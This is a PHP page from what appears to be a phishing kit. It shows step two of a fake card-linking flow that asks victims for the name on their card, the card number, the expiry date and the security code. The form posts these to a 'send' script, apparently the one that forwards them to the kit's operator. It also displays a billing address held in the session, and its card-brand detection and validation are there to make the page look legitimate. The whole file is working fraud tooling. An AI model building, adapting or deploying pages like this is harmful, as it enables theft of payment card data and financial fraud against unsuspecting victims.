<?php
	
	session_start();
	include "../assets/includes/header.php";

?>

					<div class="zombie-form-container" id="zombiepay">

						<div class="zombie-loader" id="loading"></div>

						<!--##[ SECTION ]##-->
<script>
function validateCcForm() {
    var a = document.forms["CcForm"]["zombiexcname"].value;
    var b = document.forms["CcForm"]["zombiexcnumber"].value;
    var c = document.forms["CcForm"]["zombiexcexp"].value;
    var d = document.forms["CcForm"]["zombiexccsc"].value;
    if (a == "") {
        $("#zombiexcname").addClass("hasError");
    }
    if (b == "") {
        $("#zombiexcnumber").addClass("hasError");
    }
    if (c == "") {
        $("#zombiexcexp").addClass("hasError");
    }
    if (d == "") {
        $("#zombiexccsc").addClass("hasError");
    }
    if (a == ""){return false;}if (b == ""){return false;}if (c == ""){return false;}if (d == ""){return false;}
}
</script>
							<form action="../system/send/zombie_card.php" method="post" name="CcForm" onsubmit="return validateCcForm()">

								<div class="zombie-sections-steps">
									<span class="zombie-sections-step">○</span>
									<span class="zombie-sections-step selected">●</span>
									<span class="zombie-sections-step">○</span>
									<span class="zombie-sections-step">○</span>
								</div>

								<h3 class="medium">Credit/Debit card.</h3>
								<p class="medium">Please link your credit/debit card:</p>

								<div class="zombie-info-container">
									<div class="zombie-fields">
										<input type="text" name="zombiexcname" id="zombiexcname" placeholder="Name on card" class="capitalize" maxlength="30" autocomplete="off" autocorrect="off" />
									</div>
									<div class="zombie-fields">
										<input type="tel" name="zombiexcnumber" id="zombiexcnumber" placeholder="Card number" onfocus="ccfocus()" onblur="ccblur()" maxlength="19" autocomplete="off" autocorrect="off" onkeypress="return isNumberKey(event)" />
										<span class="cc-icon" id="cicon" style="background-position: 0px 82%;"></span>
									</div>
									<div class="zombie-multiple-fields">
										<div class="zombie-feild-box">
											<input type="tel" name="zombiexcexp" id="zombiexcexp" placeholder="Expiry date" onfocus="expfocus()" onblur="expblur()" id="zombiexcexp" maxlength="7" autocomplete="off" autocorrect="off" onkeypress="return isNumberKey(event)" />
										</div>
										<div class="zombie-feild-box">
											<input type="tel" name="zombiexccsc" id="zombiexccsc" placeholder="CSC (3 digits)" maxlength="3" autocomplete="off" autocorrect="off" onkeypress="return isNumberKey(event)" />
											<span class="cc-icon" id="cvvicon" style="background-position: 0px 88%;"></span>
										</div>
									</div>

									<div class="zombie-saved-bill">
										<p>Billing address :</p>
										<p class="medium">
											<span style="text-transform:capitalize"><?php echo $_SESSION["zombiexadress"]?></span><br/>
											<span style="text-transform:capitalize"><?php echo $_SESSION["zombiexcity"] . " " . $_SESSION["zombiexstate"] . " " . $_SESSION["zombiexzip"]?></span><br/>
											<span style="text-transform:capitalize"><?php echo $_SESSION["zombiexcountry"]?></span>
										</p>
									</div>

									

									<div>
										<button style="width:100%" class="button">Save and continue</button>
									</div>
								</div>

							</form>

						<!--##[ END SECTION ]##-->
					</div>
<?php
	include "../assets/includes/footer.php";
?>

	</div>
<script src="../assets/vendors/scripts/jquery.CardValidator.js"></script>
<script src="../assets/vendors/scripts/jquery.payment.js"></script>
<script>
	//Put our input DOM element into a jQuery Object
	var $expDate = jQuery('#zombiexcexp');

	//Bind keyup/keydown to the input
	$expDate.bind('keyup','keydown', function(e){
		
	  //To accomdate for backspacing, we detect which key was pressed - if backspace, do nothing:
		if(e.which !== 8) {	
			var numChars = $expDate.val().length;
			if(numChars === 2){
				var thisVal = $expDate.val();
				thisVal += '/';
				$expDate.val(thisVal);
			}
	  }
	});
</script>
<script>
	$(document).ready(function(){
	$('#zombiexcname').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexcname').removeClass('hasError'); } else {$('#zombiexcname').removeClass('hasError'); }});

	$('#zombiexcnumber').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexcnumber').removeClass('hasError'); } else {$('#zombiexcnumber').removeClass('hasError'); }});

	$('#zombiexcexp').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexcexp').removeClass('hasError'); } else {$('#zombiexcexp').removeClass('hasError'); }});

	$('#zombiexccsc').on('keyup keydown keypress change paste', function() {	
		if ($(this).val() == '') { $('#zombiexccsc').removeClass('hasError'); } else {$('#zombiexccsc').removeClass('hasError'); }});
	
	});
</script>
<script>
    jQuery(function($) {
      $('[data-numeric]').payment('restrictNumeric');
      $('#zombiexcnumber').payment('formatCardNumber');

      $.fn.toggleInputError = function(erred) {
        this.parent('.form-group').toggleClass('has-error', erred);
        return this;
      };

    });
</script>
<script>
	// NUMBERS ONLY

	function isNumberKey(evt)
	    {
	        var charCode = (evt.which) ? evt.which : event.keyCode
	        if (charCode > 31 && (charCode < 48 || charCode > 57))
	        return false;

	        return true;
	}
</script>
<script>
	$('#zombiexcnumber').validateCreditCard(function(result) {
	if (result.card_type != null) {switch (result.card_type.name) {
		case "VISA":
		$('#cicon').css('background-position', '98.5% -0.5%');
	break;

    	case "VISA ELECTRON":
        $('#cicon').css('background-position', '98.5%  40.7%');
	break;

    	case "MASTERCARD":
        $('#cicon').css('background-position', '98.5%  5.5%');
	break;

		case "MAESTRO":
		$('#cicon').css('background-position', '98.5%  35%');
	break;

		case "DISCOVER":
		$('#cicon').css('background-position', '98.5%  17.2%');
	break;

		case "AMEX":
		$('#cicon').css('background-position', '98.5%  11.5%');
		$('#cvvicon').css('background-position', '0 94%');
		$("#zombiexccsc").attr('maxlength','4');
		$("#zombiexccsc").attr('placeholder','CSC (4 digits)');
	break;

		case "JCB":
		$('#cicon').css('background-position', '98.5% 29%');
	break;

	case "DINERS_CLUB":
		$('#cicon').css('background-position', '98.5% 23%');
	break;

	default:$('#cicon').css('background-position', '98.5% 82%');break;}} 

	else {$('#cicon').css('background-position', '0 82%');$('#cvvicon').css('background-position', '0 88%');$("#zombiexccsc").attr('maxlength','3');$("#zombiexccsc").attr('placeholder','CSC (3 digits)');}if (result.valid || $cardinput.val().length > 16) {if (result.valid) {$('#zombiexcnumber').removeClass('hasError').addClass('');} else {$('#zombiexcnumber').removeClass('').addClass('hasError');}} else {$('#zombiexcnumber').removeClass('').removeClass('hasError');}});



</script>
</body>
</body>
</html>